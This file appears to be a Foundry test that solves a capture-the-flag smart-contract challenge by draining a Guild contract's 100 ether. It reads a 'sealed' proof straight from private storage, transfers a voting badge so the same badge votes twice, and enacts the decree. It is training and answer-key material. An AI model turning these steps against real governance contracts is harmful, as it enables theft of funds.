// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import {Test} from "forge-std/Test.sol";

import {Challenge} from "src/##-overseer/Challenge.sol";
import {Guild} from "src/##-overseer/Guild.sol";
import {Overseer} from "src/##-overseer/Overseer.sol";
import {SealedTurncloak} from "src/##-overseer/elders/SealedTurncloak.sol";

contract SolveTest is Test {
  uint256 internal constant INITIAL_GUILD_BALANCE = 100 ether;

  bytes32 internal constant DECREE_PROPOSED = keccak256("DECREE_PROPOSED");
  bytes32 internal constant DECREE_VOTED = keccak256("DECREE_VOTED");
  bytes32 internal constant DECREE_ENACTED = keccak256("DECREE_ENACTED");

  Challenge internal challenge;
  Guild internal guild;
  Overseer internal overseer;
  SealedTurncloak internal sealedTurncloak;

  address internal deployer;
  address internal player;
  address internal attacker;

  function setUp() public {
    deployer = makeAddr("deployer");
    player = makeAddr("player");
    attacker = makeAddr("attacker");

    vm.deal(deployer, INITIAL_GUILD_BALANCE);

    vm.prank(deployer);
    challenge = new Challenge{value: INITIAL_GUILD_BALANCE}(player);

    guild = challenge.guild();
    overseer = challenge.overseer();
    sealedTurncloak = challenge.sealedTurncloak();
  }

  function testSolve() public {
    bytes16 decreeId = bytes16(keccak256("drain-guild"));
    bytes16 playerBadge = overseer.folkToBadge(player);
    bytes16 guildBadge = guild.badge();

    Guild.Edict[] memory edicts = new Guild.Edict[](1);
    edicts[0] = Guild.Edict({to: attacker, value: INITIAL_GUILD_BALANCE, data: ""});

    vm.prank(player);
    overseer.oversee(playerBadge, guildBadge, DECREE_PROPOSED, bytes32(decreeId), abi.encode(decreeId, edicts));

    vm.prank(player);
    overseer.oversee(playerBadge, guildBadge, DECREE_VOTED, bytes32(decreeId), abi.encode(decreeId, Guild.Verdict.Aye));

    uint256 proof = uint256(vm.load(address(sealedTurncloak), bytes32(uint256(10))));
    sealedTurncloak.unseal(decreeId, uint8(Guild.Verdict.Aye), proof);

    vm.prank(player);
    overseer.proposeBadgeChange(attacker);

    vm.prank(attacker);
    overseer.acceptBadgeChange(playerBadge);

    vm.prank(attacker);
    overseer.oversee(playerBadge, guildBadge, DECREE_VOTED, bytes32(decreeId), abi.encode(decreeId, Guild.Verdict.Aye));

    vm.roll(block.number + 16);

    vm.prank(attacker);
    overseer.oversee(playerBadge, guildBadge, DECREE_ENACTED, bytes32(decreeId), abi.encode(decreeId));

    assertEq(address(guild).balance, 0);
    assertEq(attacker.balance, INITIAL_GUILD_BALANCE);
    assertTrue(challenge.isSolved());
  }
}
